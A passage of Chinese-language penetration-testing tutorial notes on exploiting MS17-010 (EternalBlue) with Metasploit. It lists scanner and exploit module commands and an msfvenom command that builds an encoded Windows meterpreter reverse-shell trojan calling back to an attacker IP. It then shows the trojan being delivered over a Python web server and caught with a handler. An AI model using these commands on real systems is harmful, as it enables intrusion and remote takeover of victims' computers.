查询 msf 与永恒之蓝相关的 模块</p>\n<p>使用命令    search ms17_010</p>\n<p>2 然后我们利用了一个永恒之蓝的 扫描模块</p>\n<p>use auxiliary/scanner/smb/smb_ms17_010</p>\n<p>3  输入  options  查看扫描模块需要配置的参数</p>\n<p>3.1 然后我们配置了 rhost  （rhost 指的是目标主机 ip）</p>\n<p>set rhost   ip</p>\n<p>4 然后我们执行扫描 输入  run</p>\n<p>发现了 可能存在漏洞的主机</p>\n<p>4  渗透利用</p>\n<hr>\n<p>1 加载 永恒之蓝漏洞利用模块</p>\n<p>use exploit/windows/smb/ms17_010_eternalblue</p>\n<p>2  输入  options  查看扫描模块需要配置的参数</p>\n<p>3.1 然后我们配置了 rhost  （rhost 指的是目标主机 ip）</p>\n<p>set rhost   ip</p>\n<p>3.2 然后我们配置了  lhost （lhost 指的是  监控主机或攻击机 ip）</p>\n<p>set lhost   ip</p>\n<p>3.3 然后我们配置了 lport  （指的是监控的端口 ）</p>\n<p>set lport   ip</p>\n<p>注意端口必须没有被占用</p>\n<p>4 然后我们执行扫描 输入  run 执行永恒之蓝漏洞利用</p>\n<p>但是发现失败  提示 模块已经利用了  但是没有返回对应 session</p>\n<p>![image.png](10-11  msfconsole 漏洞利用流程.assets/bffdb79061ad4b0aa92d2dfde83e9f1b.png)</p>\n<p>5  备选方案通过植入木马的方式进行利用</p>\n<hr>\n<p>1  我们知道目标机器是 win 系统  所以使用 msfvenom  生成一个 win 平台的木马</p>\n<p>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp</p>\n<p>LHOST=192.168.3.33 LPORT=4446 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 10  -f exe -o payload.exe</p>\n<p>2 漏洞生成后  通过启动一个 py 服务将木马上传到目标机器</p>\n<p>python -m SimpleHTTPServer 80</p>\n<p>3 配置监控程序我们使用了</p>\n<p>use exploit/multi/handler</p>\n<p>3 输入 options 进入配置</p>\n<p>3.1 然后我们配置了  lhost （lhost 指的是  监控主机或攻击机 ip）</p>\n<p>set lhost   ip</p>\n<p>3.2 然后我们配置了 lport  （指的是监控的端口 ）</p>\n<p>set lport   ip</p>\n<p>注意端口必须和 msfvenom 生成的木马端口一样才行</p>\n<p>4 配置攻击载荷 payload</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n<p>5 执行利用等待目标机器执行木马</p>\n<p>6 目标机器执行了木马</p>\n<p>利用成功并获得 meterpreter</p>\n<hr>\n<p>5  后渗透利用</p>\n<p>进入新文档</p>\n<p>6  报告阶段</p>\n",
            "tags": []
        }
    ]
}